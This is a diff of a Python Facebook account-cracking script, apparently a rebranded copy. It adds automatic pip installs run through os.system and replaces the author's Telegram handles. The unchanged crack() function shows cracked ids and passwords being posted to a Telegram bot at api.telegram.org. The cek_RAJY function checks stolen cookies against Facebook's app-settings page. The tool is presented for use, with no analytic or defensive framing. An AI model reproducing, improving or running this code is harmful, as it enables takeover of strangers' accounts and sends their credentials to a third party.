@@ -1,4 +1,16 @@
-#
+import os
+
+libs = ['requests','websocket', 'websocket-client==1.1.0', 'sys', 'random', 'threading', 'rich', 'random', 'bs4','webbrowser','sys']
+
+for lib in libs:
+    try:
+        __import__(lib)
+        print('\033[92mتم التحقق من وجود المكتبة {}'.format(lib))
+    except ImportError:
+        print('\033[93mجاري تحميل المكتبة {}'.format(lib))
+        os.system('pip install {}'.format(lib))
+
+print('\033[1;33mتم تحميل جميع المكتبات')
 import requests,os,sys,random,datetime,time,re,json
 from random import randint
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -101,7 +113,7 @@ logo='''
 ⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠐⠖⠚⠒⠞⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠸⠽⠷⣄⣀⣀⣠⡶⠋⠀⢠⡟
 ⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⢯⡛⡷⠚⠁⢀⡴⠋⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠒⠦⠤⠤⠤⠴⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠲⠿⠷⠒⠛⠉⠀
-TELEGRAM | @z_s_o | @viphmode
+TELEGRAM | @z_s_o | @R_A_J_Y
 ————————————————
 
 ————————————————
@@ -583,7 +595,7 @@ def crack(idf,pwv):
 		id : {idf} ♕
 		pas : {pw} ♕
 		 <><><><><><>HMD<><><><><><><> 
-		PY : @z_s_o , @VIPHMODE
+		PY : @z_s_o , @R_A_J_Y
 		''')
                     	
                     	requests.post(f'https://api.telegram.org/bot{toen}/sendMessage?chat_id={ID}&text= {HMD} ')
@@ -621,7 +633,7 @@ def crack(idf,pwv):
 		PASS : {pw} ♕
 		{infoakun}
 		 <><><><><><>HMD<><><><><><><> 
-		PY : @z_s_o , @VIPHMODE
+		PY : @z_s_o , @R_A_J_Y
 		''')
                     			print(infoakun1)
                     			requests.post(f'https://api.telegram.org/bot{toen}/sendMessage?chat_id={ID}&text= {infoakun} ')
@@ -637,7 +649,7 @@ def crack(idf,pwv):
             except requests.exceptions.ConnectionError:
                 time.sleep(31)
         loop+=1
-        def cek_RAJY(kuki):
+def cek_RAJY(kuki):
     session = requests.Session()
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
     sop = bs4.BeautifulSoup(w,"html.parser")
